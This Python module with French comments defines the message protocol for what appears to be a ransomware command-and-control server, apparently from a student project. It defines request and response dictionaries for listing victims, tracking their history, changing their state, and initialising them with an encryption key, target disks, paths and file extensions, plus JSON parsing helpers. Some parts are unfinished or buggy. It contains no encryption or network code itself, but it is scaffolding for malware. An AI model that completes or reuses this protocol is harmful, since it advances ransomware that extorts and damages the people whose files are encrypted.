# Définition des messages
# List_victim messages
import json

LIST_VICTIM_REQ = {
    'LIST_REQ': None
}  # Exemple, suite à compléter

LIST_VICTIM_RESP = {
    'HASH': hash,
    'OS': '',
    'DISKS': '',
    'STATE': '',
    'NB_FILES': 0
}

LIST_VICTIM_END = {
    'LIST_END': None
}

# history messages
HISTORY_REQ = {
    'HIST_REQ': hash,
}
HISTORY_RESP = {
    'HIST_RESP': hash,
    'TIMESTAMP': '',
    'STATE': '',
    'NB_FILES': 0
}
HISTORY_END = {
    'HIST_END': None
}

# change_state message
CHANGE_STATE = {
    'CHGSTATE': hash,
    'STATE': ''
}

# initialize message
INITIALIZE_REQ = {
    'INITIALIZE': '',
    'OS': '',
    'DISKS': ''
}
INITIALIZE_KEY = {
    'KEY_RESP': hash,
    'KEY': '',
    'STATE': ''
}
INITIALIZE_RESP = {
    'CONFIGURE': hash,
    'SETTING': {
        'DISKS': None,
        'PATHS': None,
        'FILE_EXT': None,
        'FREQ': None,
        'KEY': None,
        'STATE': ''
    }
}

# message_type
MESSAGE_TYPE = {
    'LIST_REQ': 'LIST_VICTIM_REQ',
    'LIST_RESP': 'LIST_VICTIM_RESP',
    'LIST_END': 'LIST_VICTIM_END',
    'HIST_REQ': 'HISTORY_REQ',
    'HIST_RESP': 'HISTORY_RESP',
    'HIST_END': 'HISTORY_END',
    'CHGSTATE': 'CHANGE_STATE',
    'INITIALIZE_REQ': 'INITIALIZE_REQ',
    'KEY_RESP': 'INITIALIZE_KEY',
    'CONFIGURE': 'INITIALIZE_RESP',
    # à compléter
}


def set_message(select_msg, params=None):
    """
    Retourne le dictionnaire correspondant à select_msg et le complète avec params si besoin.
    :param select_msg: le message à récupérer (ex: LIST_VICTIM_REQ)
    :param params: les éventuels paramètres à ajouter au message
    :return: le message sous forme de dictionnaire
    """
    if select_msg.upper() == 'LIST_VICTIM_REQ':
        return LIST_VICTIM_REQ
    elif select_msg.upper() == 'LIST_VICTIM_RESP':
        return LIST_VICTIM_RESP
    elif select_msg.upper() == 'LIST_VICTIM_END':
        return LIST_VICTIM_END
    elif select_msg.upper() == 'HISTORY_REQ':
        if params != 0:
            return HISTORY_REQ[params]
    elif select_msg.upper() == 'HISTORY_RESP':
        return HISTORY_RESP
    elif select_msg.upper() == 'HISTORY_END':
        return HISTORY_END
    elif select_msg.upper() == 'CHANGE_STATE':
        return CHANGE_STATE
    elif select_msg.upper() == 'INITIALIZE_REQ':
        return INITIALIZE_REQ
    elif select_msg.upper() == 'INITIALIZE_KEY':
        return INITIALIZE_KEY
    elif select_msg.upper() == 'INITIALIZE_RESP':
        return INITIALIZE_RESP
    elif select_msg.upper() in MESSAGE_TYPE:
        # Si le message correspond à un type de message dans MESSAGE_TYPE
        # On retourne le type de message correspondant
        return {MESSAGE_TYPE[select_msg.upper()]: params}
    else:
        return None


def get_message_type(message):
    """
    Récupère le nom correspondant au type de message (ex: le dictionnaire LIST_VICTIM_REQ retourne 'LIST_REQ')
    :param message: le dictionnaire représentant le message
    :return: une chaine correspondant au nom du message comme définit par le protocole
    """
    sms_json = json.loads(message)
    key = list(sms_json.keys())
    values = list(sms_json.values())
    result = [key[0], values[0]]
    return result

def json_to_dict(message):
    """
    Convertie le message en dictionnaire
    :param message: le dictionnaire représentant le message
    :return: Le message converti en dictionnaire
    """
    sms_json = json.loads(message)
    return sms_json


if __name__ == '__main__':
    print(get_message_type('{"VICTIM_HISTORY_REQ": "1"}'))
